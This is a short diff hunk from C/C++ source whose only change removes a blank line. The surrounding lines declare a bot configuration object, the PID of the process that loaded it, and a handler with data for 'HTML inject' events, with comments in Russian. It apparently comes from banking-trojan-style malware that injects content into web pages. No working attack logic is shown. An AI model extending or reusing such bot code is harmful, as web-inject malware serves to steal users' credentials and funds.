@@ -42,7 +42,6 @@ TBotConfig* BotConfig;
 DWORD BotConfigPID = 0; // PID Процесса в котором загружался конфиг
 
 
-
 #ifdef BV_APP
 LPVOID InjectEventData; // Данные для вызова события
 THTMLInjectEvent InjectEvent; // Обработчик события HTML инжекта
